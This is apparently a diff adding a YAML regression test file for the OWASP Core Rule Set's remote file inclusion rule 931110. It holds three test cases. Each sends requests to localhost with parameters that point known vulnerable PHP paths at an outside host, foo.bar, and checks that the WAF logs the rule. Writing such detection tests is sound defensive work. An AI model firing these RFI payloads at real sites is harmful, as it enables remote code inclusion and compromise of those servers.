@@ -1,0 +1,70 @@
+---
+meta:
+  author: csanders-git
+  description: None
+  enabled: true
+  name: 931110.yaml
+tests:
+  - test_title: 931110-1
+    desc: Remote File Inclusion Attack (931110) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate
+              Accept-Language: zh-sg
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              Referer: http
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar
+            version: HTTP/1.1
+          output:
+            log_contains: id "931110"
+  - test_title: 931110-2
+    desc: Remote File Inclusion Attack (931110) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate
+              Accept-Language: zh-sg
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              Referer: http
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /components/com_virtuemart/show_image_in_imgtag.php?mosConfig_absolute_path=https://foo.bar
+            version: HTTP/1.1
+          output:
+            log_contains: id "931110"
+  - test_title: 931110-3
+    desc: Remote File Inclusion Attack (931110) from old modsec regressions
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+              Accept-Encoding: gzip, deflate
+              Accept-Language: zh-sg
+              Host: localhost
+              Keep-Alive: '300'
+              Proxy-Connection: keep-alive
+              Referer: http
+              User-Agent: "OWASP CRS test agent"
+            method: GET
+            port: 80
+            uri: /plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar
+            version: HTTP/1.1
+          output:
+            log_contains: id "931110"
